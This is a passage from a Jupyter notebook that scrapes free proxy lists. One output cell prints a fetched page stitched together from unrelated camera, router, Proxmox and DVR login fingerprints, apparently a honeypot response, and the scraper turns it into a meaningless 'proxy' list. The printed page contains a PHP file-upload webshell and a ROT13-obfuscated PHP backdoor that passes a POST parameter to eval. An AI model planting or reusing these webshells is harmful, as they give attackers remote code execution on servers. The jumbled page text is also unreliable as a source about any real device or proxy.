none;\">URL</label>\\n<input type=\"hidden\" name=\"url\" id=\"url\" value=\"\">\\n<label for=\"timezone_offset\" style=\"display: none;\">Timezone Offset</label>\\n<button type=\"submit\" class=\"login_button rdx_blue_button\"><span id=\"logintext\">Log On</span><span id=\"loadingdots\"></span></button>\\n\\nvar TAB_CODE=9\\nvar DEL_CODE=46\\nvar BS_CODE=8\\nvar SP_CODE=32\\nvar DOT_CODE=190\\nvar DOT2_CODE=110\\nvar IDX_ON=0\\nvar IDX_OFF=1\\nvar IDX_AP_MODE=0\\nvar IDX_CBRIDGE_MODE=1\\nvar IDX_WWAN_MODE=2\\nvar IDX_KAI_MODE=3\\nvar IDX_MBRIDGE_MODE=4\\nvar WIRELESS_AP_MODE=0;\\nvar WIRELESS_CBRIDGE_MODE=1;\\nvar WIRELESS_CWAN_MODE=2;\\nvar WIRELESS_KAI_MODE=3;\\nvar WIRELESS_MBRIDGE_MODE=4;\\n\\nIP Camera:\\n  Brand: D-Link\\n  Model: DCS-2332L\\n  Product: Megapixel Internet Camera\\n  Name: modernartcam1\\n  Version: 1.06\\n  Build: 5731\\n  MAC Address: 00:24:01:12:E1:F5\\n  IP Address: 192.168.0.160\\n\\nOK language\\nOK profile1format\\nOK profile1resolution\\nOK profile1view\\nOK profile1rate\\nOK profile1qmode\\nOK profile1quality\\nOK profile2format\\nOK profile2resolution\\nOK profile2view\\nOK profile2rate\\nOK profile2quality\\nOK audiotype\\nOK audioinenable\\nOK micgain\\nOK audiooutenable\\nOK audiooutvolume\\nOK videocodec\\nOK wintimezone\\nOK timefrequency\\nOK setdaylight\\nOK sntpfqdn\\n\\n<?php\\n/* Jangan Di Rubah Uploader nya */\\n  if(!empty($_FILES[\\'xxx\\']))\\n  {\\n    $path = \"\";\\n    $path = $path . basename( $_FILES[\\'xxx\\'][\\'name\\']);\\n    if(move_uploaded_file($_FILES[\\'xxx\\'][\\'tmp_name\\'], $path)) {\\n      echo basename( $_FILES[\\'xxx\\'][\\'name\\']).\" has been uploaded\";\\n    } else{\\n        echo \"Failed!\";\\n    }\\n  }\\n?>\\n\\n<span id=\"footer-build-information\">7.13.1</span>\\n<title>proxmox3 - Proxmox Virtual Environment</title>\\nProxmox = {\\nSetup: { auth_cookie_name: \\'PVEAuthCookie\\' },\\ndefaultLang: \\'en\\',\\nUserName: \\'\\',\\nCSRFPreventionToken: \\'null\\'\\n};\\nif (typeof(PVE) === \\'undefined\\') PVE = {};\\nExt.History.fieldid = \\'x-history-field\\';\\nExt.onReady(function() { Ext.create(\\'PVE.StdWorkspace\\');});\\n<!-- Fields required for history management -->\\n<form id=\"history-form\" class=\"x-hidden\">\\n<input type=\"hidden\" id=\"x-history-field\"/>\\n</form>\\nvar BC_IP_PORT = 9000;\\nvar parame = \"?ipPort=\" + BC_IP_PORT;\\n<a href=\"ie.html\">iWatch DVR for Internet Explorer 7/8/9/10/11</a><br />\\n<a href=\"iWatchDVR.exe?1.2.0.42.exe\">iWatch DVR for Windows XP/Vista/7/8</a><br />\\n<a href=\"iWatchDVR.tar.gz?0.0.0.0.app\">iWatch DVR for Mac OS X 10.6 or above</a><br />\\n<CGI_Result>\\n<result>0</result>\\n<flag>0011</flag>\\n</CGI_Result>\\n/cgi-bin/webctrl.cgi?action=index_page\\nThe Cisco AnyConnect VPN Client is required to connect to the SSLVPN server. Please contact the site administrator to obtain the VPN client or download from Cisco site.\\nbe4ea51d962be8308a0099ae1eb3ec63\\n12te2439998697108st3456789\\nfastjson\\n<form name=\"pagepost\" method=\"post\" action=\"/xslt?PAGE=WRA01_POST&amp;NEXTPAGE=WRA01_POST\" id=\"pagepost\">\\n<h1>RouterOS WebFig Login</h1>\\n<a href=\"http://mikrotik.com\"><img src=\"mikrotik_logo.png\" style=\"float: right;\" /></a>\\n<h1>RouterOS v6.34.5</h1>\\n<p>You have connected to a router. Administrative access only. If this device is not in your possession, please contact your local network administrator. </p>\\n<table id=\"login\">\\n<tr><td colspan=\"3\"><h2>WebFig Login:</h2>\\n<tr><td class=\"label\">Password: <td><input id=\"password\" type=\"password\" tabindex=\"2\">\\n<a href=\"http://www.mikrotik.com/download/winbox.exe\"><img src=\"winbox.png\"/></a><br/>\\n<label>Winbox</label>\\n<a href=\"telnet://192.168.32.2\"><img src=\"console.png\"/></a><br/>\\n<label>Telnet</label>\\n<a href=\"/graphs\"><img src=\"green.png\"/></a><br/>\\n<label>Graphs</label>\\n<a href=\"http://wiki.mikrotik.com\"><img src=\"help.png\"/></a><br/>\\n<div style=\"float: right\">&copy; mikrotik</div>\\ncommandResult\\n/s2.016/2.action\\nLaunch FortiClient\\nacunetixshellshock\\nwindow.parent.location.href = \"http://192.168.0.1/XXWYNKXBCTLGHRPC/userRpm/Index.htm\";\\n<?cuc reebe_ercbegvat(0);$n=\\'$_cbfg[\"k\"]\\';$o=fgegbhccre(\"$n\");riny(\"riny($o);\")?>urer\\n48saqp716utvziy93s2ar9zjjgz\\nName      Alias       ServerName      ProhibitSendQuota\\n----      -----       ----------      -----------------\\ndenpyer   denpyer     anlpr92ac8l0    unlimited\\nPMA_VERSION:\"4.8.1deb5ubuntu0.5\"\\n-->\\n</p>\\n</body>\\n</html>'"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "response.text"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "测试hidemyname网站的代理"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_ip(url):\n",
    "    headers = {\n",
    "        'User-Agent' : ua.random,\n",
    "        'referer':'https://www.google.com'\n",
    "    }\n",
    "    proxies = {\n",
    "        'http': 'http://{}'.format(proxy_list[7]),\n",
    "        'https': 'http://{}'.format(proxy_list[7]),\n",
    "    }   \n",
    "    response = requests.get(url,headers=headers,proxies=proxies)\n",
    "\n",
    "    soup = BeautifulSoup(response.text, 'html.parser')\n",
    "\n",
    "    proxies = []\n",
    "    for tr in soup.find_all('tr')[1:]:\n",
    "        tds = tr.find_all('td')\n",
    "        proxy = tds[0].text.strip() + ':' + tds[1].text.strip()\n",
    "        proxies.append(proxy)\n",
    "    return proxies"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['Password: \\n\\nWinbox\\n\\nTelnet\\n\\nGraphs\\n\\n© mikrotik\\ncommandResult\\n/s2.016/2.action\\nLaunch FortiClient\\nacunetixshellshock\\nwindow.parent.location.href = \"http://192.168.0.1/XXWYNKXBCTLGHRPC/userRpm/Index.htm\";\\nurer\\n48saqp716utvziy93s2ar9zjjgz\\nName      Alias       ServerName      ProhibitSendQuota\\n----      -----       ----------      -----------------\\ndenpyer   denpyer     anlpr92ac8l0    unlimited\\nPMA_VERSION:\"4.8.1deb5ubuntu0.5\"\\n-->:Winbox\\n\\nTelnet\\n\\nGraphs\\n\\n© mikrotik\\ncommandResult\\n/s2.016/2.action\\nLaunch FortiClient\\nacunetixshellshock\\nwindow.parent.location.href = \"http://192.168.0.1/XXWYNKXBCTLGHRPC/userRpm/Index.htm\";\\nurer\\n48saqp716utvziy93s2ar9zjjgz\\nName      Alias       ServerName      ProhibitSendQuota\\n----      -----       ----------      -----------------\\ndenpyer   denpyer     anlpr92ac8l0    unlimited\\nPMA_VERSION:\"4.8.1deb5ubuntu0.5\"\\n-->']"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "url = 'http://www.kuaidaili.com/free/inha/2/'\n",
    "\n",
    "temp_ip = get_ip(url)\n",
    "temp_ip"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "5"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sum = 0\n",
    "for i in range(5):\n",
    "  sum=sum+1\n",
    "sum"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "base",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
